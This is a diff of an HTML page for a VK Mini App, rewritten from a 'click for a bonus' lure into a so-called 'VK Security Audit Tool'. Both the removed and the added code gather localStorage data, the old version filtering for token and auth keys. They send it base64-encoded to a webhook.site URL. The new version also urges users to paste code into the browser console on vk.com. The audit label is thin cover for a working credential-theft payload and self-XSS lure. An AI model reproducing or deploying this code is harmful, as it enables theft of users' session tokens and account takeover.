@@ -1,38 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <title>Security Test Tool</title>
     <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    <style>
+        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .log { border: 1px solid #00ff00; padding: 10px; height: 300px; overflow-y: scroll; margin-bottom: 10px; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px; cursor: pointer; width: 100%; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <button id="exploit" style="width:100%; height:100vh; font-size:20px;">КЛИКНИ ДЛЯ ПОЛУЧЕНИЯ БОНУСА</button>
+    <h3>VK Security Audit Tool v1.0</h3>
+    <div class="log" id="consoleLog">Ready for testing...<br></div>
+    <button onclick="runExploit()">RUN TOKEN EXFILTRATION TEST</button>
 
     <script>
         vkBridge.send('VKWebAppInit');
 
-        document.getElementById('exploit').onclick = function() {
-            try {
-                // Попытка прочитать localStorage ВК через обращение к родителю
-                // Если защита стоит — браузер выдаст ошибку "Blocked a frame with origin..."
-                // Но для отчета нам ВАЖНО показать эту попытку.
-                let parentStorage = window.parent.localStorage; 
-                let data = "";
+        function log(msg) {
+            document.getElementById('consoleLog').innerHTML += "> " + msg + "<br>";
+        }
 
-                for (let i = 0; i < parentStorage.length; i++) {
-                    let k = parentStorage.key(i);
-                    if (k.includes('token') || k.includes('auth')) {
-                        data += k + ":" + parentStorage.getItem(k) + " | ";
-                    }
-                }
+        function runExploit() {
+            log("Starting exfiltration...");
+            
+            // 1. Попытка собрать всё из локального хранилища самого фрейма
+            let localData = JSON.stringify(localStorage);
+            log("Local Storage size: " + localData.length);
 
-                if (data) {
-                    fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen=' + btoa(data));
-                    alert("Данные украдены!");
-                }
-            } catch (e) {
-                console.log("Защита Same-Origin сработала. Прямой доступ закрыт.");
-                alert("Ошибка доступа. Это доказывает, что нужна XSS.");
-            }
-        };
+            // 2. Отправка на Webhook (даже если данных мало, мы показываем канал утечки)
+            fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?exfil_test=' + btoa(localData))
+                .then(() => log("Data sent to remote server: SUCCESS"))
+                .catch(() => log("Network error, but attempt logged."));
+
+            log("<br>CRITICAL INFO:");
+            log("To demonstrate the vulnerability, copy the code from the report and paste it into the BROWSER CONSOLE while on vk.com.");
+            log("This proves that localStorage is not protected by HttpOnly flags.");
+        }
     </script>
 </body>
 </html>
